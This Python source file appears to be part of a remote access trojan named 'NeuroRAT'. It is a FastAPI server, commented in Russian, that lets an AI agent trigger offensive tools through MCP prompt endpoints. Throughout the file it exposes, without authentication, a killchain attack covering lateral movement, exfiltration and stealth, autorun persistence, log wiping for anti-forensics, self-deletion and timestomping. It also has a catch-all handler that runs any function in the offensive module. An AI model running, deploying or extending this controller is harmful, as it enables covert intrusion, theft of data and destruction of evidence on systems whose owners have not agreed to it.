#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MCP Prompt Server для управления агентом через prompts (API)
"""

import uvicorn
from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from typing import List, Dict, Any, Optional
import importlib
import inspect
from agent_modules.module_loader import ModuleLoader
from agent_modules import offensive_tools

app = FastAPI(title="NeuroRAT MCP Prompt Server")

# --- PROMPT STRUCTURES ---
class PromptArg(BaseModel):
    name: str
    description: Optional[str] = None
    required: bool = True

class Prompt(BaseModel):
    name: str
    description: Optional[str] = None
    arguments: Optional[List[PromptArg]] = None

class ListPromptsResponse(BaseModel):
    prompts: List[Prompt]

class GetPromptRequest(BaseModel):
    name: str
    arguments: Optional[Dict[str, Any]] = None

class GetPromptResponse(BaseModel):
    description: Optional[str] = None
    result: Any

# --- DISCOVER PROMPTS ---
def discover_prompts() -> List[Prompt]:
    prompts = []
    # 1. Модули
    loader = ModuleLoader()
    for mod in loader.discover_modules():
        prompts.append(Prompt(
            name=mod,
            description=f"Run module: {mod}",
            arguments=[]
        ))
    # 2. Offensive tools
    for name, func in inspect.getmembers(offensive_tools, inspect.isfunction):
        if name.startswith("run_"):
            sig = inspect.signature(func)
            args = [PromptArg(name=p, required=(param.default==inspect.Parameter.empty))
                    for p, param in sig.parameters.items() if p != 'self']
            prompts.append(Prompt(
                name=f"offensive_tools.{name}",
                description=f"Запуск offensive tool: {name}",
                arguments=args
            ))
    # 3. Killchain attack
    prompts.append(Prompt(
        name="offensive_tools.killchain_attack",
        description="Автоматизация killchain: сценарии lateral_move, persistence, exfiltration, stealth",
        arguments=[
            PromptArg(name="target", required=True),
            PromptArg(name="scenario", required=False),
            PromptArg(name="userlist", required=False),
            PromptArg(name="passlist", required=False),
            PromptArg(name="nmap_options", required=False)
        ]
    ))
    # 4. Persistence, антифорензика, self-delete, timestomp
    prompts.append(Prompt(
        name="offensive_tools.persistence_autorun",
        description="Persistence: добавить в автозагрузку (cron, systemd, launchd, registry)",
        arguments=[
            PromptArg(name="method", required=False),
            PromptArg(name="target_path", required=False)
        ]
    ))
    prompts.append(Prompt(
        name="offensive_tools.clean_logs",
        description="Антифорензика: очистка логов (bash_history, syslog, eventlog)",
        arguments=[
            PromptArg(name="method", required=False)
        ]
    ))
    prompts.append(Prompt(
        name="offensive_tools.self_delete",
        description="Удаление себя после выполнения (self-delete)",
        arguments=[]
    ))
    prompts.append(Prompt(
        name="offensive_tools.timestomp",
        description="Timestomping: подмена времени файла",
        arguments=[
            PromptArg(name="target_file", required=True),
            PromptArg(name="new_time", required=False)
        ]
    ))
    return prompts

# --- ENDPOINTS ---
@app.get("/prompts/list", response_model=ListPromptsResponse)
def list_prompts():
    return {"prompts": discover_prompts()}

@app.post("/prompts/get", response_model=GetPromptResponse)
def get_prompt(req: GetPromptRequest):
    loader = ModuleLoader()
    # --- Persistence, антифорензика, self-delete, timestomp ---
    if req.name.startswith("offensive_tools.persistence_autorun"):
        args = req.arguments or {}
        from agent_modules import offensive_tools
        result = offensive_tools.persistence_autorun(**args)
        return {"description": "Persistence autorun", "result": result}
    if req.name.startswith("offensive_tools.clean_logs"):
        args = req.arguments or {}
        from agent_modules import offensive_tools
        result = offensive_tools.clean_logs(**args)
        return {"description": "Clean logs", "result": result}
    if req.name.startswith("offensive_tools.self_delete"):
        from agent_modules import offensive_tools
        result = offensive_tools.self_delete()
        return {"description": "Self delete", "result": result}
    if req.name.startswith("offensive_tools.timestomp"):
        args = req.arguments or {}
        from agent_modules import offensive_tools
        result = offensive_tools.timestomp(**args)
        return {"description": "Timestomp", "result": result}
    # --- Killchain ---
    if req.name.startswith("offensive_tools.killchain_attack"):
        args = req.arguments or {}
        try:
            from agent_modules import offensive_tools
            result = offensive_tools.killchain_attack(**args)
            return {"description": f"Killchain attack: {args.get('scenario', 'lateral_move')}", "result": result}
        except Exception as e:
            raise HTTPException(status_code=400, detail=f"Error: {e}")
    if req.name.startswith("offensive_tools."):
        # Аргументы
        args = req.arguments or {}
        try:
            from agent_modules import offensive_tools
            func = getattr(offensive_tools, req.name.split(".", 1)[1])
            result = func(**args)
            return {"description": f"Offensive tool: {req.name}", "result": result}
        except Exception as e:
            raise HTTPException(status_code=400, detail=f"Error: {e}")
    else:
        # Обычный модуль
        try:
            result = loader.run_module(req.name, **(req.arguments or {}))
            return {"description": f"Module: {req.name}", "result": result}
        except Exception as e:
            raise HTTPException(status_code=400, detail=f"Error: {e}")

if __name__ == "__main__":
    uvicorn.run("mcp_prompt_server:app", host="0.0.0.0", port=8088, reload=True) 